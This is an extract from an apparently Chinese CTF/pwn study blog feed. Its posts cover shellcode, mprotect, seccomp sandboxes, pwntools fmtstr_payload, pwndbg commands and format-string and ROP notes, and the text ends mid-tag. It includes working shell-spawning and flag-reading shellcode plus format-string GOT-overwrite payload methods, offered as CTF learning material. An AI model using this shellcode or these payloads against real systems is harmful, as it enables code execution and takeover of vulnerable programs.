纯ascii字符shellcode</h1><p>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</p><h1 id="64位的cat-flag"><a href="#64位的cat-flag" class="headerlink" title="64位的cat flag"></a>64位的cat flag</h1><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\xb8flagPH\x89\xe71\xf61\xc0\x04\x02\x0f\x05\x89\xc7H\x89\xe6f\xb8\x01\x011\xd2f\x89\xc2f\x01\xc61\xc0\x0f\x051\xfff\xff\xc7f\xff\xc71\xc0\xfe\xc0\x0f\x05<br></code></pre></td></tr></table></figure><h1 id="短字节shell"><a href="#短字节shell" class="headerlink" title="短字节shell"></a>短字节shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apl">#32 18字节<br>push   0xb<br>pop    eax<br>push   ebx<br>push   0x68732f2f<br>push   0x6e69622f<br>mov    ebx,esp<br>int    0x80<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apl">#64 22字节<br>xor rsi,rsi<br>pushrsi<br>mov rdi,0x68732f2f6e69622f <br>pushrdi<br>pushrsp<br>poprdi<br>mov al,59<br>cdq<br>syscall<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mprotect函数</title>
    <link href="/2024/05/04/mprotect%E5%87%BD%E6%95%B0/"/>
    <url>/2024/05/04/mprotect%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure><p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-number">1</span>）PROT_READ：表示内存段内的内容可写；<br><br><span class="hljs-number">2</span>）PROT_WRITE：表示内存段内的内容可读；<br><br><span class="hljs-number">3</span>）PROT_EXEC：表示内存段中的内容可执行；<br><br><span class="hljs-number">4</span>）PROT_NONE：表示内存段中的内容根本没法访问。<br>这里的参数prot：<br><span class="hljs-symbol">r:</span><span class="hljs-number">4</span><br><span class="hljs-symbol">w:</span><span class="hljs-number">2</span><br><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>）EACCES<br>该内存不能设置为相应权限。这是可能发生的，比如，如果你 <span class="hljs-built_in">mmap</span>(<span class="hljs-number">2</span>) 映射一个文件为只读的，接着使用 <span class="hljs-built_in">mprotect</span>() 标志为 PROT_WRITE。<br><br><span class="hljs-number">2</span>）EINVAL<br><br>start 不是一个有效的指针，指向的不是某个内存页的开头。<br><br><span class="hljs-number">3</span>）ENOMEM<br><br>内核内部的结构体无法分配。<br><br><span class="hljs-number">4</span>）ENOMEM<br><br>进程的地址空间在区间 <span class="hljs-selector-attr">[start, start+len]</span> 范围内是无效，或者有一个或多个内存页没有映射。 <br></code></pre></td></tr></table></figure><p>如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sandbox的实现函数</title>
    <link href="/2024/05/04/sandbox%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0/"/>
    <url>/2024/05/04/sandbox%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="prctl函数"><a href="#prctl函数" class="headerlink" title="prctl函数"></a>prctl函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// option选项有很多，剩下的参数也由option确定，这里介绍两个主要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则禁用execve系统调用且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br><br></code></pre></td></tr></table></figure><h2 id="seccomp库函数"><a href="#seccomp库函数" class="headerlink" title="seccomp库函数"></a>seccomp库函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <br>  <span class="hljs-comment">// 两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)</span><br>  <span class="hljs-comment">// seccomp初始化，参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式</span><br>  v1 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v1 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// seccomp_rule_add添加规则</span><br>  <span class="hljs-comment">// v1对应上面初始化的返回值</span><br>  <span class="hljs-comment">// 0x7fff0000即对应宏SCMP_ACT_ALLOW</span><br>  <span class="hljs-comment">// 第三个参数代表对应的系统调用号，0--&gt;read/1--&gt;write/2--&gt;open/60--&gt;exit</span><br>  <span class="hljs-comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传0不做任何限制</span><br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000</span>LL, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000</span>LL, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000</span>LL, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000</span>LL, <span class="hljs-number">60LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000</span>LL, <span class="hljs-number">231LL</span>, <span class="hljs-number">0LL</span>);<br><br>  <span class="hljs-comment">// seccomp_load - Load the current seccomp filter into the kernel</span><br>  <span class="hljs-keyword">if</span> ( seccomp_load(v1) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>  <span class="hljs-comment">// seccomp_release - Release the seccomp filter state</span><br>  <span class="hljs-comment">// 但对已经load的过滤规则不影响</span><br>    seccomp_release(v1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> seccomp_release(v1);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用seccomp-tools识别沙盒"><a href="#使用seccomp-tools识别沙盒" class="headerlink" title="使用seccomp-tools识别沙盒"></a>使用seccomp-tools识别沙盒</h2><p>可以直接使用该工具识别pwn题到底禁用了哪些系统调用以及允许哪些系统调用，基本用法如下代码所示。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">seccomp-tools <span class="hljs-keyword">dump</span> ./文件名<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwntools-fmtstr_payload</title>
    <link href="/2024/05/04/Pwntools-fmtstr-payload/"/>
    <url>/2024/05/04/Pwntools-fmtstr-payload/</url>
    
    <content type="html"><![CDATA[<h1 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h1><p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>漏洞的构造工作。</p><p>可以实现修改任意内存<br>fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-built_in">fmtstr_payload</span>(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=‘<span class="hljs-type">byte</span>’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；本题是将<span class="hljs-number">0804</span>a048处改为<span class="hljs-number">0x2223322</span><br>第三个参数表示已经输出的字符个数，这里没有，为<span class="hljs-number">0</span>，采用默认值即可；<br>第四个参数表示写入方式，是按字节（<span class="hljs-type">byte</span>）、按双字节（<span class="hljs-type">short</span>）还是按四字节（<span class="hljs-type">int</span>），对应着hhn、hn和n，默认值是<span class="hljs-type">byte</span>，即按hhn写。<br>fmtstr_payload函数返回的就是payload<br></code></pre></td></tr></table></figure><p><strong>实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240510205517088.png" alt="image-20240510205517088"><br>这个是专门为<strong>32位</strong>程序格式化字符串漏洞输出payload的一个函数</p><p><code>__libc_csu_fini</code>就是在**<code>main</code>执行完毕后执行**</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwngdb的使用</title>
    <link href="/2024/05/04/pwngdb%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/05/04/pwngdb%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><ul><li><p>help   &#x2F;&#x2F;帮助</p></li><li><p>i      &#x2F;&#x2F;info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用<br>i b   &#x2F;<strong>&#x2F;常用</strong>，info break 查看所有断点信息（编号、断点位置）<br>i r    &#x2F;&#x2F;<strong>常用</strong>，info registers 查看各个寄存器当前的值<br>i f    &#x2F;&#x2F;info function 查看所有函数名，需保留符号</p></li><li><p>show  &#x2F;&#x2F;和info类似，但是查看调试器的基本信息，如：</p><p>show args  &#x2F;&#x2F;查看参数</p></li><li><p>rdi  &#x2F;&#x2F;<strong>常用</strong>，+寄存器名代表一个寄存器内的值，<strong>用在地址上直接相当与一个十六进制变量</strong></p></li><li><p>backtrace &#x2F;&#x2F;查看调用栈</p></li><li><p>q &#x2F;&#x2F;quit 退出，<strong>常用</strong></p></li></ul><h2 id="执行指令"><a href="#执行指令" class="headerlink" title="执行指令"></a>执行指令</h2><ul><li>s &#x2F;&#x2F;单步步入，遇到调用跟进函数中，相当于step into，源码层面的一步</li><li>si &#x2F;&#x2F;常用，同s，汇编层面的一步</li><li>n &#x2F;&#x2F;单步补过，遇到电泳不跟进，相当于step over，源码层面的一步</li><li>ni &#x2F;&#x2F;常用，同n，汇编层面的一步</li><li>c &#x2F;&#x2F;continue，常用，继续执行到断点，没断点就一直执行下去</li><li>r &#x2F;&#x2F;run，常用，重新开始执行</li></ul><h2 id="断点指令"><a href="#断点指令" class="headerlink" title="断点指令"></a>断点指令</h2><h5 id="下普通断点指令b-break-："><a href="#下普通断点指令b-break-：" class="headerlink" title="下普通断点指令b(break)："></a>下普通断点指令b(break)：</h5><ul><li><p>b *(0x123456) &#x2F;&#x2F;常用，给0x123456地址处的指令下断点</p><p>​     b *$rebase(0x123456) &#x2F;&#x2F;$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</p></li><li><p>b fun_name &#x2F;&#x2F;常用，给函数fun_name下断点，目标文件要保留符号才行</p><p>​     b file_name:fun_name</p></li><li><p>b file_name:15 &#x2F;&#x2F;给file_name的15行下断点，要有源码才行</p><p>​     b 15</p></li><li><p>b +0x10 &#x2F;&#x2F;在程序当前停住的位置下0x10的位置下断点，同样可以-0x10，就是前0x10</p></li><li><p>break fun if $rdi&#x3D;&#x3D;5 &#x2F;&#x2F;条件断点，rdi值为5的时候才断</p></li></ul><h5 id="删除、禁用断点："><a href="#删除、禁用断点：" class="headerlink" title="删除、禁用断点："></a>删除、禁用断点：</h5><ul><li>使用info break(简写: i b)来查看断点编号</li><li>delete 5 &#x2F;&#x2F;<strong>常用</strong>，删除5号断点，直接delete不接数字删除所有</li><li>disable 5 &#x2F;&#x2F;常用，禁用5号断点<ul><li>enable 5 &#x2F;&#x2F;启用5号断点</li></ul></li><li>clear &#x2F;&#x2F;清除下面的所有断点</li></ul><h5 id="内存断点指令watch："><a href="#内存断点指令watch：" class="headerlink" title="内存断点指令watch："></a><strong>内存断点指令watch：</strong></h5><ul><li>watch 0x123456   &#x2F;&#x2F;0x123456地址的数据改变的时候会断</li><li>watch a   &#x2F;&#x2F;变量a改变的时候会断</li><li>info watchpoints   &#x2F;&#x2F;查看watch断点信息</li></ul><h5 id="捕获断点catch："><a href="#捕获断点catch：" class="headerlink" title="捕获断点catch："></a><strong>捕获断点catch：</strong></h5><ul><li><p>catch syscall &#x2F;&#x2F;syscall系统调用的时候断住</p></li><li><p>tcatch syscall &#x2F;&#x2F;syscall系统调用的时候断住，只断一次</p></li><li><p>info break &#x2F;&#x2F;catch的断点可以通过i b查看</p></li><li><p>除syscall外还可以使用的有：</p><p>​      throw: 抛出异常</p><p>​      catch: 捕获异常</p><p>​      exec: exec被调用</p><p>​      fork: fork被调用</p><p>​      vfork: vfork被调用</p><p>​      load: 加载动态库</p><p>​      load libname: 加载名为libname的动态库</p><p>​      unload: 卸载动态库</p><p>​      unload libname: 卸载名为libname的动态库</p><p>​      syscall [args]: 调用系统调用，args可以指定系统调用号，或者系统名称</p></li></ul><h2 id="打印指令："><a href="#打印指令：" class="headerlink" title="打印指令："></a><strong>打印指令</strong>：</h2><p><strong>查看内存指令x：</strong></p><ul><li><p>x &#x2F;nuf 0x123456 &#x2F;&#x2F;常用，x指令的格式是：x空格&#x2F;nfu，<strong>nfu代表三个参数</strong></p></li><li><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’&#x2F;‘后面</p></li><li><p>u代表一个单元几个字节，b(一个字节)，h(俩字节)，w(四字节)，g(八字节)</p></li><li><p>f代表显示数据的格式，<strong>f和u的顺序可以互换</strong>，也可以只有一个或者不带n，用的时候很灵活</p><p><img src="C:\Users\刘先生\AppData\Roaming\Typora\typora-user-images\image-20230413204103398.png" alt="image-20230413204103398"></p></li><li><p>x &#x2F;10gx 0x123456 &#x2F;&#x2F;常用，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p></li><li><p>x &#x2F;10xd $rdi &#x2F;&#x2F;<strong>从rdi指向的地址</strong>向后打印10个单元，每个单元4字节的十进制数</p></li><li><p>x &#x2F;10i 0x123456 &#x2F;&#x2F;常用，从0x123456处向后显示十条汇编指令</p></li></ul><h5 id="打印指令p-print-："><a href="#打印指令p-print-：" class="headerlink" title="打印指令p(print)："></a>打印指令p(print)：</h5><ul><li>p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号</li><li>p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果</li><li>p &amp;a &#x2F;&#x2F;查看变量或者函数a的地址</li><li>p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号</li><li>p $rdi &#x2F;&#x2F;显示rdi寄存器的值，<strong>注意和x的区别，这只是显示rdi的值，而不是rdi指向的值</strong><br>*<em>p <em>($rdi) &#x2F;&#x2F;显示rdi指向的值</em></em></li></ul><h5 id="打印汇编指令disass-disassemble-："><a href="#打印汇编指令disass-disassemble-：" class="headerlink" title="打印汇编指令disass(disassemble)："></a>打印汇编指令disass(disassemble)：</h5><ul><li>disass 0x123456 &#x2F;&#x2F;显示0x123456前后的汇编指令</li><li>x &#x2F;10i &#x2F;&#x2F;<strong>可以用x显示指令</strong></li></ul><h5 id="打印源代码指令list："><a href="#打印源代码指令list：" class="headerlink" title="打印源代码指令list："></a>打印源代码指令list：</h5><ul><li>list &#x2F;&#x2F;查看当前附近10行代码，要有源码，list指令pwn题中几乎不用，但为了完整性还是简单举几个例子<ul><li>list 38 &#x2F;&#x2F;查看38行附近10行代码</li><li>list 1,10 &#x2F;&#x2F;查看1-10行</li><li>list main &#x2F;&#x2F;查看main函数开始10行</li></ul></li></ul><h2 id="修改和查找指令"><a href="#修改和查找指令" class="headerlink" title="修改和查找指令"></a>修改和查找指令</h2><h5 id="修改数据指令set："><a href="#修改数据指令set：" class="headerlink" title="修改数据指令set："></a>修改数据指令set：</h5><ul><li>set $rdi&#x3D;0x10 &#x2F;&#x2F;把rdi寄存器的值变为0x10</li><li>set *(0x123456)&#x3D;0x10 &#x2F;&#x2F;0x123456地址的值变为0x10，注意带星号</li><li>set args “abc” “def” “gh“&#x2F;&#x2F;给参数123赋值</li><li>set args “python -c ‘print “1234\x7f\xde”’” &#x2F;&#x2F;使用python给参数赋值不可见字符</li></ul><h5 id="查找数据："><a href="#查找数据：" class="headerlink" title="查找数据："></a>查找数据：</h5><ul><li>search rdi &#x2F;&#x2F;从当前位置向后查包含rdi的指令，返回若干</li><li>search -h &#x2F;&#x2F;查看search帮助，我也不太长用这个指令</li><li>find “hello” &#x2F;&#x2F;查找hello字符串，pwndbg独有</li><li>ropgadget &#x2F;&#x2F;查找ropgadget，pwndbg独有，没啥用，可以用其他工具</li></ul><h2 id="堆操作指令"><a href="#堆操作指令" class="headerlink" title="堆操作指令"></a>堆操作指令</h2><ul><li>arena &#x2F;&#x2F;显示arena的详细信息</li><li>arenas &#x2F;&#x2F;显示所有arena的基本信息</li><li>arenainfo &#x2F;&#x2F;好看的显示所有arena的信息</li><li>bins &#x2F;&#x2F;常用，查看所有种类的堆块的链表情况</li><li>fastbins &#x2F;&#x2F;单独查看fastbins的链表情况</li><li>largebins &#x2F;&#x2F;同上，单独查看largebins的链表情况</li><li>smallbins &#x2F;&#x2F;同上，单独查看smallbins的链表情况</li><li>unsortedbin &#x2F;&#x2F;同上，单独查看unsortedbin链表情况</li><li>tcachebins &#x2F;&#x2F;同上，单独查看tcachebins的链表情况</li><li>tcache &#x2F;&#x2F;查看tcache详细信息</li><li>heap &#x2F;&#x2F;数据结构的形式显示所有堆块，会显示一大堆</li><li>heapbase &#x2F;&#x2F;查看堆起始地址</li><li>heapinfo、heapinfoall &#x2F;&#x2F;显示堆得信息，和bins的挺像的，没bins好用</li><li>parseheap &#x2F;&#x2F;显示堆结构，很好用</li><li>tracemalloc &#x2F;&#x2F;好用，会跟提示所有操作堆的地方</li></ul><h2 id="其他独有指令"><a href="#其他独有指令" class="headerlink" title="其他独有指令"></a>其他独有指令</h2><ul><li><p>cyclc 50 &#x2F;&#x2F;生成50个用来溢出的字符</p><p>​       cyclc -l 字符，找到特定字符在生成的字符串的位置</p></li><li><p>$reabse &#x2F;&#x2F;开启PIE的情况的地址偏移</p></li><li><p>b *$reabse(0x123456) &#x2F;&#x2F;断住PIE状态下的二进制文件中0x123456的地方</p><p>​      codebase &#x2F;&#x2F;打印PIE偏移，与rebase不同，这是打印，rebase是使用</p></li><li><p>stack &#x2F;&#x2F;查看栈</p></li><li><p>retaddr &#x2F;&#x2F;打印包含返回地址的栈地址</p></li><li><p>canary &#x2F;&#x2F;直接看canary的值</p></li><li><p>plt &#x2F;&#x2F;查看plt表</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>杂七杂八的pwn</title>
    <link href="/2024/05/01/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84pwn/"/>
    <url>/2024/05/01/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84pwn/</url>
    
    <content type="html"><![CDATA[<p>栈，即堆栈，是一种具有一定规则的数据结构，它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶。<br>也就是esp到ebp之间<br>代码段：存放可执行程序的代码，可读不可写<br>数据段：存放程序中已经初始化的静态（全局）变量，可读写<br>bss段：存放程序中未初始化的静态（全局）变量，可读写<br>堆（heap）：存放动态分配的内容，需要程序猿手动分配和释放<br>栈（stack）：存放局部变量，如函数的参数、返回地址、局部变量等，有系统自动分配和释放</p><p>要背记的指令<br>gedit 文件名.py<br>chomd 777 文件名<br>remote是远程，process是本地<br>recvline 或recvuntil #使程序停止到某一行<br>ROP的命令: ROPgadget –binary 文件名 –sting ‘要找的字符串’</p><h3 id="Ropgatget命令"><a href="#Ropgatget命令" class="headerlink" title="Ropgatget命令"></a>Ropgatget命令</h3><p>命令: ROPgadget –binary 文件名 –only “pop|ret” | grep rdi<br>命令: ROPgadget –binary 文件名 –only “pop|ret” | grep rsi<br>命令: ROPgadget –binary 文件名  –only ‘pop|ret’ | grep ‘eax’   &#x2F;&#x2F;寻找控制 eax 的 gadgets<br>命令: ROPgadget –binary 文件名 –only “pop|ret”<br>命令: ROPgadget –binary 文件名  –only ‘int’   查找有int 0x80的地址<br>该工具除了可以用来查找 ret&#x2F;rdi的地址,还可以用来查找一些字符串的地址<br>命令: ROPgadget –binary 文件名 –string ‘&#x2F;bin&#x2F;sh’<br>命令: ROPgadget –binary 文件名 –string ‘&#x2F;sh’<br>命令: ROPgadget –binary 文件名 –string ‘sh’<br>命令: ROPgadget –binary 文件名 –string ‘cat flag’<br>命令: ROPgadget –binary 文件名 –string ‘cat flag.txt’<br>直接利用程序中的片段拼凑rop链 （必须是静态编译的情况）<br>命令：ROPgadget –binary 文件名 –ropchain</p><p>寻找某一个文件的位置：find -name 文件名</p><p>#asm()将接受到的字符串转变为汇编码的机器代码,而shellcraft可以生成asm下的shellcode，如：asm(shellcraft.sh())</p><p>查看程序运行情况：context(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’,log_level &#x3D; ‘debug’)（写在脚本中，等于是运用了工具）</p><h3 id="关于格式化漏洞的知识点"><a href="#关于格式化漏洞的知识点" class="headerlink" title="关于格式化漏洞的知识点"></a>关于格式化漏洞的知识点</h3><p>​       好了，接下来说一下找到的偏移如何用，构造payload：p32(system_got)+b”%6$s”，此时system的got表地址会存在栈上，<br>也就是printf的第六个参数位置；而%6$s表示打印出第六个参数作为地址指向的内容，所以此时该payload就会打印出system的真实地址。<br>再构造payload：p32(system_got)+b”%6$n”，%6$n表示往第六个参数指向的内存中写4个字节宽的内容，而写的数值是print已经打印的<br>内容长度，printf此时打印的长度是p32(system_got)的长度，也就是4，所以此时该payload就会改写system真实地址为4。<br>  上面的讲解是以32位题目为例，在遇到64位时会有些不同，这里先总结一下。首先64位前6个参数是以寄存器传参，且字长为8，<br>所以此时寻找偏移的payload应该这样构造：aaaaaaaa-%p-%p-%p-%p-%p-%p。另外由于寄存器传参的原因，<br>从第6个格式化符号开始才会打印栈上的内容。最后一个重点是，由于字长为8，64的地址存在零，<br>所以想要利用偏移来泄露地址内容或者改写其内容的话，目的地址不能放在格式化符号之前，否则printf在遇到零字节时会被截断，<br>此时应将目的地址放在格式化符号后面。</p><p>参数在栈上的地址&#x3D;ebp-偏移量</p><p>本地的libc查找就是ldd +文件名</p><h3 id="堆相关的知识："><a href="#堆相关的知识：" class="headerlink" title="堆相关的知识："></a>堆相关的知识：</h3><p>add，就是简单的创建一个chunk<br>在创建堆时有一个结构体，这个结构体大概是这样的：<br>struct pr_heap<br>{<br>double alloc_or_not;   #0或者1，表示是否分配（0表示没有分配，1表示分配）<br>double size;           #创建chunk的大小<br>void *heap;            #chunk的内存地址<br>};</p><h3 id="寄存器用途约定"><a href="#寄存器用途约定" class="headerlink" title="寄存器用途约定"></a>寄存器用途约定</h3><p>（1）64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 &gt; 当参数为7个以上时，<br>前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br>（2）64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r _。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。<br>（3）32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值<br>（4）64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用<br>（5）64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p><p>用于存储传入参数：rdi，rsi，rdx，rcx，r8，r9 用作函数参数，依次对应第1参数，第2参数…<br>用于存放返回结果：%rax。<br>用于数据存储：rbx，rbp，r12，r13，14，15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改<br>r10，r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值</p><h3 id="系统调用的知识"><a href="#系统调用的知识" class="headerlink" 